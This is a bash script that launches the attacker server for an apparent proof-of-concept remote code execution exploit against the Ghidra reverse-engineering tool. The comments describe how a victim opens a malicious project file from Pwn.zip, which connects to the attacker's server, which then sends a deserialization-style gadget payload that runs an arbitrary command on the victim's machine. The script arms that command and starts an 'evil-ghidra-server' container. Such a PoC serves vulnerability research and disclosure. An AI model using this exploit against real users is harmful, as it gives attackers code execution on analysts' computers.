#!/bin/bash
#
# demo.sh -- start the attacker server for the Ghidra-client-RCE PoC.
#
# The victim side of this attack is the analyst's actual Ghidra install; only
# the attacker runs in Docker.  Flow:
#
#   (on attacker)   ./build.sh <host> <port>              ->  Pwn.zip
#                   ./demo.sh  --cmd '<cmd>'  [--host 0.0.0.0] [--port 13100]
#
#   (on victim)     unzip Pwn.zip
#                   open Ghidra, File -> Open Project -> EvilProject.gpr
#                     (or double-click EvilProject.gpr if .gpr is associated)
#
#                   '<cmd>' runs on the victim's host.
#
# The command is chosen *here*, not at build time -- the zip contains only a
# URL pointing at this server; the gadget payload is generated on the fly when
# the victim connects, so you can re-arm without rebuilding Pwn.zip.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
HOST="${HOST:-0.0.0.0}"
PORT="${PORT:-13100}"
CMD="${CMD:-}"

while [[ $# -gt 0 ]]; do
    case "$1" in
        --host)  HOST="$2"; shift 2 ;;
        --port)  PORT="$2"; shift 2 ;;
        --cmd)   CMD="$2";  shift 2 ;;
        --help|-h)
            grep '^#' "$0" | head -40; exit 0 ;;
        *) echo "unknown flag: $1" >&2; exit 1 ;;
    esac
done

if [[ -z "$CMD" ]]; then
    CMD='open -a Calculator'
    echo "[demo] no --cmd / \$CMD; defaulting to: $CMD" >&2
fi

export CMD
export PORT
export HOST

# Build and launch the attacker container with Docker Compose.
cd "$SCRIPT_DIR/docker"

echo "[demo] building evil-ghidra-server image"
docker compose build --quiet

echo "[demo] starting evil-ghidra-server on ${HOST}:${PORT} (+1 for SSL probe)"
echo "[demo]   command armed : $CMD"
echo ""
echo "Now, on the victim, open the project in Ghidra:"
echo "    unzip Pwn.zip && open EvilProject/EvilProject.gpr    # macOS"
echo ""
echo "[demo] attach container logs with Ctrl-C to stop:"
echo ""

docker compose up --abort-on-container-exit
